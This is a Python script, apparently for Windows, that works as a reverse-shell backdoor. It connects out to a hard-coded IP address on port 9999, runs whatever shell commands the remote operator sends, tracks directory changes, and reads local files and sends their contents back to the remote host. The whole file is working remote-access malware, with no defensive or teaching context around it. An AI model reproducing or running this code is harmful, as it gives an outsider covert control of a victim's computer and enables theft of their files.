import socket
import subprocess

    

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('165.227.9.185', 9999))

nav = ""

def get_loc(nav):
    if nav == "":
        r = subprocess.check_output("dir", shell = True).decode("gb2312", "ignore")
    else:
        r = subprocess.check_output(nav + " && " + "dir", shell = True).decode("gb2312", "ignore")
    end = r.find(" 的目录")
    start = r[:end].rfind("\n")
    return r[start + 2 : end]

if s.recv(1024).decode("utf-8") == "you connect successfully!":
    print("connect successfully")
    while True:
        to_do = s.recv(1024).decode("utf-8")
        print("to_do:", to_do)
        if to_do.find("exit1997") != -1:
            print("time to exit")
            s.send(b"bye done1997")
            break
        elif to_do[:3] == "dld":
            try:
                if nav == "":
                    file_path = to_do[4:]
                else:
                    file_path = get_loc(nav) + "/" + to_do[4:]
                print("dld file:", file_path)
                f = open(file_path, "rb")
                file_content = f.read().decode("utf-8")
                print("file_content:", file_content)
                f.close()
            except:
                file_content = "download err"
            print("dld file content:", file_content)
            s.send((file_content + "\ndone1997").encode("gb2312", "ignore"))

        elif to_do[:2] == "cd" or to_do[:2].lower() == "a:" or to_do[:2].lower() == "c:" or to_do[:2].lower() == "d:" or to_do[:2].lower() == "e:" or to_do[:2].lower() == "f:" or to_do[:2].lower() == "g:":
            if nav == "":
                nav = to_do
                loc = get_loc(nav)
                s.send(("now your location is: " + loc + "\ndone1997").encode("gb2312", "ignore"))
            else:
            	try:
            		if nav == "":
            			loc = get_loc(to_do)
            		else:
            		    loc = get_loc(nav + " && " + to_do)
            		nav = nav + " && " + to_do
            		print("now your location is: " + loc)
            		s.send(("now your location is: " + loc + "\ndone1997").encode("gb2312", "ignore"))
            	except:
            		print("cd err")
            		s.send(b"cd err done1997")
        else:
            try:
                if nav == "":
                    output = subprocess.check_output(to_do, shell = True)
                else:
                    #print("echo test")
                    #print("nav", nav)
                    #print("to_do", to_do)
                    output = subprocess.check_output(nav + " && " + to_do, shell = True)
            except:
                output = b"run cmd err"
            if output == b"":
                output = b"return value is empty string, so I return this"
            print("output:", output.decode("gb2312", "ignore"))
            s.send((output + b"\ndone1997").decode("gb2312", "ignore").encode("gb2312", "ignore"))
            

s.close()
print("connection closed")
